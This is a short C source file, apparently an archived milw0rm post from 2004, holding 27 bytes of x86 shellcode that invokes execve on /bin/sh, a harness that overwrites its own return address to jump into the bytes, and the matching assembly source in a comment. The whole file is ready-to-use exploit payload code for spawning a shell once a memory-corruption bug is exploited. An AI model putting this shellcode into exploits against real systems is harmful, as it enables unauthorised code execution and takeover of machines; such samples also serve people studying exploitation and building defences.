/* execve_sh.c by n0gada
   27 bytes.
*/
#include <stdio.h>

char shellcode[]=
"\xeb\x0d\x5f\x31\xc0\x50\x89\xe2"
"\x52\x57\x54\xb0\x3b\xcd\x80\xe8"
"\xee\xff\xff\xff/bin/sh";

int main(void)
{
 int *ret;

	printf("%d\n",strlen(shellcode));
	ret = (int *)&ret+2;
	*ret = (int)shellcode;

return 0;

}

/*********************************************
execve_sh.s

	.globl main
	main:
		jmp strings
	start:
		pop %edi
		xorl %eax,%eax
		push %eax
		movl %esp,%edx
		push %edx
		push %edi
		push %esp
		movb $0x3b,%al
		int $0x80

	strings: call start
		.string "/bin/sh"

*********************************************/

// milw0rm.com [2004-09-26]